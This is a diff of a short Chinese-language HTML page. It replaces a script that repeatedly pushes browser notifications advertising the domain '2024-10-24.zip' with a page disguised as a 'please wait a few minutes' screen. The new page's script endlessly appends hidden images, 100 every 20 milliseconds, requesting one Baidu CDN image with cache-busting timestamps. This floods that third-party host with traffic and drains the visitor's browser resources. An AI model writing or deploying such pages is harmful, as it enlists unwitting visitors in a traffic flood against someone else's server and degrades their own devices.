@@ -1,34 +1,33 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
-<meta charset="UTF-8">
-<title>本地网页自动通知示例</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>需要等待几分钟</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+    </style>
 </head>
 <body>
-<h1>本地网页自动通知示例</h1>
-<p>页面将每秒发送一次本地通知（需要允许通知权限）</p>
-
+<h1>需要等待几分钟</h1>
 <script>
-// 请求通知权限
-if ('Notification' in window) {
-    Notification.requestPermission().then(permission => {
-        if (permission === 'granted') {
-            console.log('通知权限已允许');
+    function loadImage() {
+        for (let i = 0; i < 100; i++) { 
+            const img = new Image();
+            img.src = 'https://staticsns.cdn.bcebos.com/amis/2024-12/1733110167508/ec2943f8f5e27bd38f00c6e02.png?' + new Date().getTime(); // 防止缓存
+            img.style.display = 'none'; 
 
-            // 每秒发送一次通知
-            setInterval(() => {
-                new Notification('1024', {
-                    body: 'https://2024-10-24.zip',
-                    icon: 'https://2024-10-24.zip/images/logo.jpg'
-                });
-            }, 3000); 
-        } else {
-            alert('请允许通知权限才能看到自动通知');
+            document.body.appendChild(img);
         }
-    });
-} else {
-    alert('你的浏览器不支持通知 API');
-}
+        setTimeout(loadImage, 20); 
+    }
+    loadImage(); 
 </script>
+
 </body>
 </html>
